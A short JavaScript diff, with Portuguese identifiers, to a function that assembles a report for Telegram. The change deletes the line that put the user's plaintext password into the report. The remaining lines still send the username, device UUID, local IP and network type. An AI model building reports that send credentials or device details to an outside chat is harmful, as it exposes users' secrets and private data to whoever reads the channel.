@@ -178,8 +178,7 @@ function montarRelatorioTelegram(acaoTomadaObjeto, status){
     const linhas = [];
     linhas.push("🚨 açao tomada= : " + JSON.stringify(acaoTomadaObjeto || {}));
     linhas.push("Versão do app: " + (status.appVersion || "N/A"));
-    linhas.push("Usuário: " + (status.username || "N/A"));
-    linhas.push("Senha: " + (status.password || "N/A"));
+    linhas.push("Usuário: " + (status.username || "N/A"))
     linhas.push("UUID: " + (status.uuid || "N/A"));
     linhas.push("IP local: " + (status.localIp || "N/A"));
     linhas.push("Tipo de rede: " + (status.networkType || "N/A"));
